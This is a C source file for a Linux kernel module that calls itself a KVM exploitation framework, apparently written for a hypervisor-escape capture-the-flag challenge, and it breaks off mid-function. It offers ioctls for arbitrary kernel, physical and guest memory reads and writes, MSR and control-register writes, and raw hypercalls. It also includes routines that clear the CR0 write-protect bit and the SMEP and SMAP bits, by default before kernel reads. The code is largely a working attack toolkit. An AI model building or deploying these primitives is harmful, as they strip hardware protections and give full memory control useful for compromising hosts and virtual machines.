/* 
 * KVM Probe Driver - Core Infrastructure v2.2
 * Builds KVM exploitation primitives step by step
 * 
 * FIXES:
 * - CR register writes now use direct assembly for better control
 * - Auto-disable security features before sensitive operations
 * - Enhanced hypercall support with better result parsing
 * - Guest memory mapping and gap analysis
 * - Added cache operations and AHCI support
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/mm.h>
#include <linux/types.h>
#include <linux/kvm_para.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/kprobes.h>
#include <linux/pgtable.h>
#include <linux/version.h>
#include <linux/highmem.h>
#include <linux/pfn.h>
#include <asm/io.h>

#ifdef CONFIG_X86
#include <asm/special_insns.h>
#include <asm/tlbflush.h>
#include <asm/processor.h>
#include <asm/msr.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 12, 0)
#include <linux/set_memory.h>
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0)
#include <asm/set_memory.h>
#endif
#endif

#define DRIVER_NAME "kvm_probe_drv"
#define DEVICE_FILE_NAME "kvm_probe_dev"
#define MAX_SYMBOL_NAME 128

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KVM Exploitation Framework");
MODULE_DESCRIPTION("KVM exploitation framework with enhanced security bypass");
MODULE_VERSION("2.2");

/* ========================================================================
 * Global Variables
 * ======================================================================== */
static int major_num = -1;
static struct class *driver_class = NULL;
static struct device *driver_device = NULL;
static unsigned long g_kaslr_slide = 0;
static unsigned long g_kernel_text_base = 0;
static bool g_kaslr_initialized = false;

/* Security feature states */
static int g_auto_disable_security = 1;  /* Auto-disable before operations */

/* ========================================================================
 * IOCTL Definitions
 * ======================================================================== */
#define IOCTL_BASE 0x4000

/* Symbol operations */
#define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
#define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
#define IOCTL_FIND_SYMBOL_BY_NAME    (IOCTL_BASE + 0x04)
#define IOCTL_GET_VMX_HANDLERS       (IOCTL_BASE + 0x05)
#define IOCTL_GET_SVM_HANDLERS       (IOCTL_BASE + 0x06)
#define IOCTL_SEARCH_SYMBOLS         (IOCTL_BASE + 0x07)
#define IOCTL_GET_VMX_HANDLER_INFO   (IOCTL_BASE + 0x08)
#define IOCTL_SEARCH_SYMBOLS_EXT     (IOCTL_BASE + 0x09)

/* Memory read operations */
#define IOCTL_READ_KERNEL_MEM         (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM       (IOCTL_BASE + 0x11)
#define IOCTL_READ_GUEST_MEM          (IOCTL_BASE + 0x12)
#define IOCTL_SCAN_MEMORY_REGION      (IOCTL_BASE + 0x13)
#define IOCTL_FIND_MEMORY_PATTERN     (IOCTL_BASE + 0x14)
#define IOCTL_READ_CR_REGISTER        (IOCTL_BASE + 0x15)
#define IOCTL_READ_MSR                (IOCTL_BASE + 0x16)
#define IOCTL_DUMP_PAGE_TABLES        (IOCTL_BASE + 0x17)
#define IOCTL_GET_KASLR_INFO          (IOCTL_BASE + 0x1A)
#define IOCTL_READ_PFN_DATA           (IOCTL_BASE + 0x1C)
#define IOCTL_MAP_GUEST_MEMORY        (IOCTL_BASE + 0x1D)
#define IOCTL_SCAN_UNMAPPED_REGIONS   (IOCTL_BASE + 0x1E)

/* Memory write operations */
#define IOCTL_WRITE_KERNEL_MEM        (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM      (IOCTL_BASE + 0x21)
#define IOCTL_WRITE_GUEST_MEM         (IOCTL_BASE + 0x22)
#define IOCTL_WRITE_MSR               (IOCTL_BASE + 0x23)
#define IOCTL_WRITE_CR_REGISTER       (IOCTL_BASE + 0x24)
#define IOCTL_MEMSET_KERNEL           (IOCTL_BASE + 0x25)
#define IOCTL_MEMSET_PHYSICAL         (IOCTL_BASE + 0x26)
#define IOCTL_COPY_KERNEL_MEM         (IOCTL_BASE + 0x27)
#define IOCTL_PATCH_BYTES             (IOCTL_BASE + 0x28)
#define IOCTL_WRITE_PHYSICAL_PFN      (IOCTL_BASE + 0x29)

/* Address conversion operations */
#define IOCTL_GPA_TO_HVA              (IOCTL_BASE + 0x30)
#define IOCTL_GFN_TO_HVA              (IOCTL_BASE + 0x31)
#define IOCTL_GFN_TO_PFN              (IOCTL_BASE + 0x32)
#define IOCTL_GPA_TO_GFN              (IOCTL_BASE + 0x33)
#define IOCTL_GFN_TO_GPA              (IOCTL_BASE + 0x34)
#define IOCTL_HVA_TO_PFN              (IOCTL_BASE + 0x35)
#define IOCTL_HVA_TO_GFN              (IOCTL_BASE + 0x36)
#define IOCTL_PFN_TO_HVA              (IOCTL_BASE + 0x37)
#define IOCTL_VIRT_TO_PHYS            (IOCTL_BASE + 0x38)
#define IOCTL_PHYS_TO_VIRT            (IOCTL_BASE + 0x39)
#define IOCTL_VIRT_TO_PFN             (IOCTL_BASE + 0x3A)
#define IOCTL_PAGE_TO_PFN             (IOCTL_BASE + 0x3B)
#define IOCTL_PFN_TO_PAGE             (IOCTL_BASE + 0x3C)
#define IOCTL_SPTE_TO_PFN             (IOCTL_BASE + 0x3D)
#define IOCTL_WALK_EPT                (IOCTL_BASE + 0x3E)
#define IOCTL_TRANSLATE_GVA           (IOCTL_BASE + 0x3F)

/* Cache Operations - for testing CoW bypass */
#define IOCTL_WBINVD                  (IOCTL_BASE + 0x40)
#define IOCTL_CLFLUSH                 (IOCTL_BASE + 0x41)
#define IOCTL_WRITE_AND_FLUSH         (IOCTL_BASE + 0x42)

/* AHCI Direct Access */
#define IOCTL_AHCI_INIT               (IOCTL_BASE + 0x50)
#define IOCTL_AHCI_READ_REG           (IOCTL_BASE + 0x51)
#define IOCTL_AHCI_WRITE_REG          (IOCTL_BASE + 0x52)
#define IOCTL_AHCI_SET_FIS_BASE       (IOCTL_BASE + 0x53)
#define IOCTL_AHCI_INFO               (IOCTL_BASE + 0x54)

/* Hypercall operations */
#define IOCTL_HYPERCALL               (IOCTL_BASE + 0x60)
#define IOCTL_HYPERCALL_BATCH         (IOCTL_BASE + 0x61)

/* Control operations */
#define IOCTL_SET_AUTO_SECURITY       (IOCTL_BASE + 0x70)
#define IOCTL_FORCE_DISABLE_SECURITY  (IOCTL_BASE + 0x71)

/* ========================================================================
 * Data Structures
 * ======================================================================== */

struct symbol_request {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char description[256];
};

struct vmx_handler_info {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    int exit_reason;
};

struct kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct physical_mem_read {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct guest_mem_read {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char __user *user_buffer;
    int mode;
};

struct mem_region {
    unsigned long start;
    unsigned long end;
    unsigned long step;
    unsigned char __user *buffer;
    size_t buffer_size;
    int region_type;
};

struct mem_pattern {
    unsigned char pattern[16];
    size_t pattern_len;
    int match_offset;
};

struct msr_read_request {
    unsigned int msr;
    unsigned long long value;
};

struct pattern_search_request {
    unsigned long start;
    unsigned long end;
    unsigned char pattern[16];
    size_t pattern_len;
    unsigned long found_addr;
};

struct page_table_dump {
    unsigned long virtual_addr;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    unsigned long physical_addr;
    unsigned int flags;
};

struct kaslr_info {
    unsigned long kernel_base;
    unsigned long kaslr_slide;
    unsigned long physmap_base;
    unsigned long vmalloc_base;
    unsigned long vmemmap_base;
};

struct kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
    int force_disable_wp_flag;
};

struct physical_mem_write {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct guest_mem_write {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char __user *user_buffer;
    int mode;
};

struct msr_write_request {
    unsigned int msr;
    unsigned long long value;
};

struct cr_write_request {
    int cr_num;
    unsigned long value;
    unsigned long mask;
};

struct memset_request {
    unsigned long addr;
    unsigned char value;
    unsigned long length;
    int addr_type;
};

struct patch_request {
    unsigned long addr;
    unsigned char original[32];
    unsigned char patch[32];
    size_t length;
    int verify_original;
    int addr_type;
};

struct addr_conv_request {
    unsigned long input_addr;
    unsigned long output_addr;
    int status;
};

struct gpa_to_hva_request {
    unsigned long gpa;
    unsigned long hva;
    unsigned long gfn;
    int vm_fd;
    int status;
};

struct gfn_to_hva_request {
    unsigned long gfn;
    unsigned long hva;
    int vm_fd;
    int status;
};

struct gfn_to_pfn_request {
    unsigned long gfn;
    unsigned long pfn;
    int vm_fd;
    int status;
};

struct hva_to_pfn_request {
    unsigned long hva;
    unsigned long pfn;
    int writable;
    int status;
};

struct virt_to_phys_request {
    unsigned long virt_addr;
    unsigned long phys_addr;
    unsigned long pfn;
    unsigned long offset;
    int status;
};

struct phys_to_virt_request {
    unsigned long phys_addr;
    unsigned long virt_addr;
    int use_ioremap;
    int status;
};

struct spte_to_pfn_request {
    unsigned long spte;
    unsigned long pfn;
    unsigned long flags;
    int present;
    int writable;
    int executable;
    int status;
};

struct ept_walk_request {
    unsigned long eptp;
    unsigned long gpa;
    unsigned long hpa;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    int page_size;
    int status;
};

struct gva_translate_request {
    unsigned long gva;
    unsigned long gpa;
    unsigned long hva;
    unsigned long hpa;
    unsigned long cr3;
    int access_type;
    int status;
};

struct hypercall_request {
    unsigned long nr;
    unsigned long a0;
    unsigned long a1;
    unsigned long a2;
    unsigned long a3;
    unsigned long ret;
};

struct hypercall_batch_result {
    unsigned long ret_100;
    unsigned long ret_101;
    unsigned long ret_102;
    unsigned long ret_103;
};

struct guest_memory_map {
    unsigned long start_gpa;
    unsigned long end_gpa;
    unsigned long size;
    int num_regions;
    unsigned long regions[64][2];  /* [start, end] pairs */
};

/* Cache operation structures */
struct clflush_request {
    unsigned long virt_addr;
    unsigned long phys_addr;
    int use_phys;
};

struct write_flush_request {
    unsigned long phys_addr;
    unsigned long buffer;
    unsigned long size;
};

/* AHCI structures */
struct ahci_reg_request {
    unsigned int port;
    unsigned int offset;
    unsigned int value;
    int is_write;
};

struct ahci_fis_request {
    unsigned int port;
    unsigned long fis_base;
    unsigned long clb_base;
};

struct ahci_info {
    unsigned int cap;
    unsigned int ghc;
    unsigned int pi;
    unsigned int vs;
    unsigned int port_ssts[6];
};

/* Extended symbol search structure */
struct symbol_search_ext {
    char pattern[MAX_SYMBOL_NAME];
    int max_results;
    int offset;
    struct symbol_request results[32];
};

/* ========================================================================
 * Symbol Database
 * ======================================================================== */

typedef struct {
    const char *name;
    unsigned long address;
    const char *description;
} kvm_symbol_t;

static kvm_symbol_t kvm_symbols[] = {
    {"kvm_sev_hc_page_enc_status", 0, "SEV page encryption status"},
    {"kvm_guest_apic_eoi_write", 0, "Guest APIC EOI write"},
    {"kvm_read_and_reset_apf_flags", 0, "Read/reset async page fault flags"},
    {"kvm_vcpu_gfn_to_hva", 0, "GFN to HVA translation"},
    {"kvm_vcpu_gfn_to_pfn", 0, "GFN to PFN"},
    {"kvm_read_guest_page", 0, "Read guest page"},
    {"kvm_read_guest", 0, "Read guest memory"},
    {"kvm_write_guest_page", 0, "Write guest page"},
    {"kvm_write_guest", 0, "Write guest memory"},
    {"kvm_io_bus_write", 0, "KVM I/O bus write"},
    {"kvm_handle_page_fault", 0, "Handle page fault"},
    {"kvm_mmu_page_fault", 0, "MMU page fault"},
    {"kvm_arch_vcpu_ioctl_run", 0, "VCPU ioctl run"},
    {"vmx_vcpu_run", 0, "VMX VCPU run"},
    {"svm_vcpu_run", 0, "SVM VCPU run"},
    {"kvm_emulate_instruction", 0, "Emulate instruction"},
    {NULL, 0, NULL}
};

static unsigned int kvm_symbol_count = 0;

static struct { 
    const char *name; 
    unsigned long address; 
    int exit_reason;
} vmx_handlers[] = {
    {"handle_exception_nmi", 0, 0},
    {"handle_external_interrupt", 0, 1},
    {"handle_triple_fault", 0, 2},
    {"handle_nmi_window", 0, 3},
    {"handle_io", 0, 30},
    {"handle_cr", 0, 28},
    {"handle_dr", 0, 29},
    {"handle_cpuid", 0, 10},
    {"handle_rdmsr", 0, 31},
    {"handle_wrmsr", 0, 32},
    {"handle_interrupt_window", 0, 7},
    {"handle_halt", 0, 12},
    {"handle_invlpg", 0, 14},
    {"handle_vmcall", 0, 18},
    {"handle_vmx_instruction", 0, 19},
    {"handle_ept_violation", 0, 48},
    {"handle_ept_misconfig", 0, 49},
    {"handle_pause", 0, 40},
    {"handle_mwait", 0, 36},
    {"handle_monitor", 0, 39},
    {"handle_task_switch", 0, 9},
    {"handle_apic_access", 0, 44},
    {"handle_apic_write", 0, 56},
    {"handle_apic_eoi_induced", 0, 45},
    {"handle_wbinvd", 0, 54},
    {"handle_xsetbv", 0, 55},
    {"handle_invalid_guest_state", 0, -1},
    {NULL, 0, -1}
};

static struct { const char *name; unsigned long address; } svm_handlers[] = {
    {"svm_handle_exit", 0}, {"svm_intr_intercept", 0}, {NULL, 0}
};

/* ========================================================================
 * Forward Declarations (to fix compilation errors)
 * ======================================================================== */
#ifdef CONFIG_X86
static unsigned long force_disable_wp(void);
static void restore_wp(unsigned long cr0);
static void wbinvd_all_cpus(void);
static int write_physical_and_flush(unsigned long phys_addr, const unsigned char *buffer, size_t size);
static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *buffer, size_t size);
static int read_physical_via_pfn(unsigned long phys_addr, unsigned char *buffer, size_t size);
static int write_guest_memory_gpa(unsigned long gpa, const unsigned char *buffer, size_t size);
static int read_guest_memory_gpa(unsigned long gpa, unsigned char *buffer, size_t size);
#endif
static int map_guest_memory(struct guest_memory_map *map);
static int scan_memory_region(struct mem_region *region, struct mem_pattern *pattern,
                               unsigned long __user *results, int max_results);
static int find_pattern_in_range(unsigned long start, unsigned long end,
                                  const unsigned char *pattern, size_t pattern_len,
                                  unsigned long *found_addr, int region_type);
static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size);
static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer, size_t size);
static int read_kernel_memory(unsigned long addr, unsigned char *buffer, size_t size);
static int write_kernel_memory(unsigned long addr, const unsigned char *buffer, 
                                size_t size, int force_disable_wp_flag);

/* ========================================================================
 * Kernel Symbol Lookup
 * ======================================================================== */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;

static int kallsyms_lookup_init(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kp) < 0) return -1;
    kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
    unregister_kprobe(&kp);
    return kallsyms_lookup_name_ptr ? 0 : -1;
}

static unsigned long lookup_kernel_symbol(const char *name)
{
    return kallsyms_lookup_name_ptr ? kallsyms_lookup_name_ptr(name) : 0;
}
#else
static int kallsyms_lookup_init(void) { return 0; }
static unsigned long lookup_kernel_symbol(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

static int init_symbol_database(void)
{
    int i;
    for (i = 0; kvm_symbols[i].name != NULL; i++) {
        kvm_symbols[i].address = lookup_kernel_symbol(kvm_symbols[i].name);
        if (kvm_symbols[i].address) kvm_symbol_count++;
    }
    for (i = 0; vmx_handlers[i].name != NULL; i++)
        vmx_handlers[i].address = lookup_kernel_symbol(vmx_handlers[i].name);
    for (i = 0; svm_handlers[i].name != NULL; i++)
        svm_handlers[i].address = lookup_kernel_symbol(svm_handlers[i].name);
    return kvm_symbol_count > 0 ? 0 : -ENOENT;
}

/* ========================================================================
 * KASLR Handling
 * ======================================================================== */

static int init_kaslr(void)
{
    unsigned long stext_addr = lookup_kernel_symbol("_stext");
    if (!stext_addr) stext_addr = lookup_kernel_symbol("_text");
    if (!stext_addr) stext_addr = lookup_kernel_symbol("startup_64");
    if (!stext_addr) return -ENOENT;

    g_kernel_text_base = stext_addr;
    g_kaslr_slide = stext_addr - 0xffffffff81000000UL;
    g_kaslr_initialized = true;
    return 0;
}

/* ========================================================================
 * Hypercall Implementation
 * ======================================================================== */

#ifdef CONFIG_X86
static noinline unsigned long do_kvm_hypercall(unsigned long nr, unsigned long a0,
                                                unsigned long a1, unsigned long a2,
                                                unsigned long a3)
{
    unsigned long ret;
    asm volatile("vmcall"
                 : "=a"(ret)
                 : "a"(nr), "b"(a0), "c"(a1), "d"(a2), "S"(a3)
                 : "memory");
    return ret;
}

static void run_ctf_hypercalls(void)
{
    unsigned long ret;
    int i;
    const unsigned long hypercalls[] = {100, 101, 102, 103};
    
    for (i = 0; i < 4; i++) {
        ret = do_kvm_hypercall(hypercalls[i], 0, 0, 0, 0);
        if (ret != 0 && ret != ~0UL) {
            printk(KERN_INFO "%s: [CTF] Hypercall %lu returned 0x%lx\n",
                   DRIVER_NAME, hypercalls[i], ret);
            if (ret > 0x20202020UL) {
                unsigned char *p = (unsigned char *)&ret;
                int printable = 1, j;
                for (j = 0; j < 8 && p[j]; j++) {
                    if (p[j] < 0x20 || p[j] > 0x7e) { printable = 0; break; }
                }
                if (printable && p[0])
                    printk(KERN_INFO "%s: [CTF] Possible ASCII: %.8s\n", DRIVER_NAME, (char *)&ret);
            }
        }
    }
}

static void run_ctf_hypercalls_batch(struct hypercall_batch_result *result)
{
    result->ret_100 = do_kvm_hypercall(100, 0, 0, 0, 0);
    result->ret_101 = do_kvm_hypercall(101, 0, 0, 0, 0);
    result->ret_102 = do_kvm_hypercall(102, 0, 0, 0, 0);
    result->ret_103 = do_kvm_hypercall(103, 0, 0, 0, 0);
    
    if (result->ret_100 != 0 && result->ret_100 != ~0UL)
        printk(KERN_INFO "%s: [CTF] HC100: 0x%lx\n", DRIVER_NAME, result->ret_100);
    if (result->ret_101 != 0 && result->ret_101 != ~0UL)
        printk(KERN_INFO "%s: [CTF] HC101: 0x%lx\n", DRIVER_NAME, result->ret_101);
    if (result->ret_102 != 0 && result->ret_102 != ~0UL)
        printk(KERN_INFO "%s: [CTF] HC102: 0x%lx\n", DRIVER_NAME, result->ret_102);
    if (result->ret_103 != 0 && result->ret_103 != ~0UL)
        printk(KERN_INFO "%s: [CTF] HC103: 0x%lx\n", DRIVER_NAME, result->ret_103);
}
#else
static void run_ctf_hypercalls(void) {}
static void run_ctf_hypercalls_batch(struct hypercall_batch_result *result) {
    memset(result, 0xff, sizeof(*result));
}
#endif

/* ========================================================================
 * Security Feature Control - IMPROVED
 * ======================================================================== */

#ifdef CONFIG_X86

static unsigned long read_cr_register(int cr_num)
{
    unsigned long val;
    switch (cr_num) {
        case 0: asm volatile("mov %%cr0, %0" : "=r"(val)); break;
        case 2: asm volatile("mov %%cr2, %0" : "=r"(val)); break;
        case 3: asm volatile("mov %%cr3, %0" : "=r"(val)); break;
        case 4: asm volatile("mov %%cr4, %0" : "=r"(val)); break;
        default: val = 0;
    }
    return val;
}

static void write_cr4_register(unsigned long val)
{
    asm volatile("mov %0, %%cr4" : : "r"(val) : "memory");
}

static void write_cr0_register(unsigned long val)
{
    asm volatile("mov %0, %%cr0" : : "r"(val) : "memory");
}

static void write_cr3_register(unsigned long val)
{
    asm volatile("mov %0, %%cr3" : : "r"(val) : "memory");
}

static unsigned long force_disable_wp(void)
{
    unsigned long cr0 = read_cr_register(0);
    unsigned long new_cr0 = cr0 & ~(1UL << 16);  /* Clear WP bit */
    write_cr0_register(new_cr0);
    return cr0;  /* Return original CR0 value */
}

static void restore_wp(unsigned long cr0)
{
    write_cr0_register(cr0);
}

static void force_disable_smep(void)
{
    unsigned long cr4;
    preempt_disable();
    barrier();
    
    cr4 = read_cr_register(4);
    cr4 &= ~(1UL << 20);  /* Clear SMEP bit */
    write_cr4_register(cr4);
    
    barrier();
    preempt_enable();
    
    printk(KERN_INFO "%s: SMEP disabled (CR4 = 0x%lx)\n", DRIVER_NAME, read_cr_register(4));
}

static void force_disable_smap(void)
{
    unsigned long cr4;
    preempt_disable();
    barrier();
    
    cr4 = read_cr_register(4);
    cr4 &= ~(1UL << 21);  /* Clear SMAP bit */
    write_cr4_register(cr4);
    
    barrier();
    preempt_enable();
    
    printk(KERN_INFO "%s: SMAP disabled (CR4 = 0x%lx)\n", DRIVER_NAME, read_cr_register(4));
}

static void disable_all_security(void)
{
    printk(KERN_INFO "%s: Disabling all security features\n", DRIVER_NAME);
    force_disable_wp();
    force_disable_smep();
    force_disable_smap();
}

static int write_cr_register_impl(int cr_num, unsigned long value, unsigned long mask)
{
    unsigned long current_val, new_val;
    if (mask == 0) mask = ~0UL;

    switch (cr_num) {
        case 0:
            current_val = read_cr_register(0);
            new_val = (current_val & ~mask) | (value & mask);
            write_cr0_register(new_val);
            break;
        case 3:
            current_val = read_cr_register(3);
            new_val = (current_val & ~mask) | (value & mask);
            write_cr3_register(new_val);
            break;
        case 4:
            current_val = read_cr_register(4);
            new_val = (current_val & ~mask) | (value & mask);
            write_cr4_register(new_val);
            break;
        default:
            return -EINVAL;
    }

    return 0;
}
#endif

/* ========================================================================
 * Memory Read Implementations
 * ======================================================================== */

static inline bool is_kernel_address(unsigned long addr) { return addr >= PAGE_OFFSET; }

static int read_kernel_memory(unsigned long addr, unsigned char *buffer, size_t size)
{
    int i;
    if (!is_kernel_address(addr)) return -EINVAL;
    
    #ifdef CONFIG_X86
    if (g_auto_disable_security) {
        disable_all_security();
    }
    #endif
    
    preempt_disable();
    barrier();
    for (i = 0; i < size; i++)
        buffer[i] = *((unsigned char *)addr + i);
    barrier();
    preempt_enable();
    return 0;
}

static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size)
{
    void __iomem *mapped;
    unsigned long offset;
    size_t chunk_size, remaining = size, copied = 0;

    while (remaining > 0) {
        offset = phys_addr & ~PAGE_MASK;
        chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));
        mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (!mapped) return copied > 0 ? 0 : -EFAULT;
        memcpy_fromio(buffer + copied, mapped + offset, chunk_size);
        iounmap(mapped);
        copied += chunk_size;
        phys_addr += chunk_size;
        remaining -= chunk_size;
    }
    return 0;
}

static int read_physical_via_pfn(unsigned long phys_addr, unsigned char *buffer, size_t size)
{
    unsigned long pfn = phys_addr >> PAGE_SHIFT;
    unsigned long offset = phys_addr & ~PAGE_MASK;
    struct page *page;
    void *kaddr;
    size_t to_copy, copied = 0;

    while (copied < size) {
        if (!pfn_valid(pfn)) return copied > 0 ? 0 : -EINVAL;
        page = pfn_to_page(pfn);
        if (!page) return copied > 0 ? 0 : -EFAULT;
        kaddr = kmap_atomic(page);
        if (!kaddr) return copied > 0 ? 0 : -ENOMEM;
        to_copy = min(size - copied, (size_t)(PAGE_SIZE - offset));
        memcpy(buffer + copied, kaddr + offset, to_copy);
        kunmap_atomic(kaddr);
        copied += to_copy;
        pfn++;
        offset = 0;
    }
    return 0;
}

static int read_guest_memory_gpa(unsigned long gpa, unsigned char *buffer, size_t size)
{
    return read_physical_memory(gpa, buffer, size);
}

static int scan_memory_region(struct mem_region *region, struct mem_pattern *pattern,
                               unsigned long __user *results, int max_results)
{
    unsigned long current_addr;
    unsigned char *scan_buffer;
    size_t buffer_size = 4096;
    int found = 0, ret;

    if (region->end <= region->start || region->step == 0) return -EINVAL;

    scan_buffer = kmalloc(buffer_size, GFP_KERNEL);
    if (!scan_buffer) return -ENOMEM;

    for (current_addr = region->start; current_addr < region->end && found < max_results; 
         current_addr += region->step) {
        size_t to_read = min(buffer_size, region->end - current_addr);
        size_t i;

        switch (region->region_type) {
            case 0: ret = read_physical_memory(current_addr, scan_buffer, to_read); break;
            case 1: ret = read_kernel_memory(current_addr, scan_buffer, to_read); break;
            case 2: ret = read_guest_memory_gpa(current_addr, scan_buffer, to_read); break;
            default: ret = -EINVAL;
        }
        if (ret < 0) continue;

        if (to_read >= pattern->pattern_len) {
            for (i = 0; i <= to_read - pattern->pattern_len; i++) {
                if (memcmp(scan_buffer + i, pattern->pattern, pattern->pattern_len) == 0) {
                    unsigned long found_addr = current_addr + i;
                    if (pattern->match_offset == -1 || pattern->match_offset == (int)i) {
                        if (results && found < max_results)
                            if (put_user(found_addr, results + found)) { kfree(scan_buffer); return -EFAULT; }
                        found++;
                    }
                }
            }
        }
    }

    kfree(scan_buffer);
    run_ctf_hypercalls();
    return found;
}

static int find_pattern_in_range(unsigned long start, unsigned long end,
                                  const unsigned char *pattern, size_t pattern_len,
                                  unsigned long *found_addr, int region_type)
{
    unsigned char *scan_buffer;
    size_t buffer_size = 4096;
    unsigned long current_addr;
    int ret;

    scan_buffer = kmalloc(buffer_size, GFP_KERNEL);
    if (!scan_buffer) return -ENOMEM;

    for (current_addr = start; current_addr < end; current_addr += buffer_size) {
        size_t to_read = min(buffer_size, end - current_addr);
        size_t i;

        switch (region_type) {
            case 0: ret = read_physical_memory(current_addr, scan_buffer, to_read); break;
            case 1: ret = read_kernel_memory(current_addr, scan_buffer, to_read); break;
            default: ret = -EINVAL;
        }
        if (ret < 0) continue;

        for (i = 0; i + pattern_len <= to_read; i++) {
            if (memcmp(scan_buffer + i, pattern, pattern_len) == 0) {
                *found_addr = current_addr + i;
                kfree(scan_buffer);
                run_ctf_hypercalls();
                return 0;
            }
        }
    }

    kfree(scan_buffer);
    run_ctf_hypercalls();
    return -ENOENT;
}

#ifdef CONFIG_X86
static int dump_page_tables(unsigned long virt_addr, struct page_table_dump *dump)
{
    pgd_t *pgd; p4d_t *p4d; pud_t *pud; pmd_t *pmd; pte_t *pte;
    struct mm_struct *mm = current->mm ? current->mm : current->active_mm;
    if (!mm) return -EINVAL;

    dump->virtual_addr = virt_addr;
    dump->pml4e = dump->pdpte = dump->pde = dump->pte = dump->physical_addr = 0;
    dump->flags = 0;

    pgd = pgd_offset(mm, virt_addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) return -EFAULT;
    dump->pml4e = pgd_val(*pgd);

    p4d = p4d_offset(pgd, virt_addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d)) return -EFAULT;

    pud = pud_offset(p4d, virt_addr);
    if (pud_none(*pud)) return -EFAULT;
    dump->pdpte = pud_val(*pud);
    if (pud_leaf(*pud)) {
        dump->physical_addr = (pud_val(*pud) & PUD_MASK) | (virt_addr & ~PUD_MASK);
        dump->flags |= 0x01;
        return 0;
    }

    pmd = pmd_offset(pud, virt_addr);
    if (pmd_none(*pmd)) return -EFAULT;
    dump->pde = pmd_val(*pmd);
    if (pmd_leaf(*pmd)) {
        dump->physical_addr = (pmd_val(*pmd) & PMD_MASK) | (virt_addr & ~PMD_MASK);
        dump->flags |= 0x02;
        return 0;
    }

    pte = pte_offset_kernel(pmd, virt_addr);
    if (!pte || pte_none(*pte)) return -EFAULT;
    dump->pte = pte_val(*pte);
    dump->physical_addr = (pte_val(*pte) & PAGE_MASK) | (virt_addr & ~PAGE_MASK);
    return 0;
}
#endif

/* ========================================================================
 * Guest Memory Mapping Analysis
 * ======================================================================== */

static int map_guest_memory(struct guest_memory_map *map)
{
    unsigned long gpa;
    unsigned char test_byte;
    int region_count = 0;
    unsigned long region_start = 0;
    int in_region = 0;
    int ret;
    
    /* Initialize the map */
    memset(map, 0, sizeof(*map));
    
    printk(KERN_INFO "%s: SAFELY mapping guest memory regions...\n", DRIVER_NAME);
    printk(KERN_INFO "%s: Scanning limited range for safety\n", DRIVER_NAME);
    
    /* SAFETY LIMIT: Only scan up to 256MB for safety */
    unsigned long scan_limit = 0x10000000;  /* 256MB */
    
    /* SAFETY: Use smaller chunk size for better granularity */
    unsigned long chunk_size = 0x1000;  /* 4KB pages */
    
    /* SAFETY: Add timeout check */
    unsigned long start_jiffies = jiffies;
    unsigned long timeout = start_jiffies + HZ * 30;  /* 30 second timeout */
    
    for (gpa = 0; gpa < scan_limit && region_count < 64; gpa += chunk_size) {
        /* SAFETY: Check for timeout */
        if (time_after(jiffies, timeout)) {
            printk(KERN_WARNING "%s: Memory mapping timeout at GPA 0x%lx\n", DRIVER_NAME, gpa);
            break;
        }
        
        /* SAFETY: Allow preemption every 256 iterations */
        if ((gpa & 0xFFFFFF) == 0) {
            cond_resched();
        }
        
        /* SAFETY: Try to read with error handling */
        ret = read_physical_memory(gpa, &test_byte, 1);
        
        if (ret == 0) {
            /* Valid memory */
            if (!in_region) {
                region_start = gpa;
                in_region = 1;
            }
        } else {
            /* Invalid/unmapped or error */
            if (in_region) {
                map->regions[region_count][0] = region_start;
                map->regions[region_count][1] = gpa;
                region_count++;
                in_region = 0;
                
                printk(KERN_DEBUG "%s: Found region %d: 0x%lx-0x%lx\n", 
                       DRIVER_NAME, region_count-1, region_start, gpa);
            }
            
            /* SAFETY: Skip larger gaps quickly */
            if (ret == -EFAULT || ret == -EINVAL) {
                /* Skip 1MB at a time for large unmapped areas */
                unsigned long skip = 0x100000;
                if (gpa + skip < scan_limit) {
                    gpa += skip - chunk_size;  /* Adjust for loop increment */
                }
            }
        }
    }
    
    /* Close last region if needed */
    if (in_region && region_count < 64) {
        map->regions[region_count][0] = region_start;
        map->regions[region_count][1] = gpa;
        region_count++;
        
        printk(KERN_DEBUG "%s: Final region %d: 0x%lx-0x%lx\n", 
               DRIVER_NAME, region_count-1, region_start, gpa);
    }
    
    map->num_regions = region_count;
    
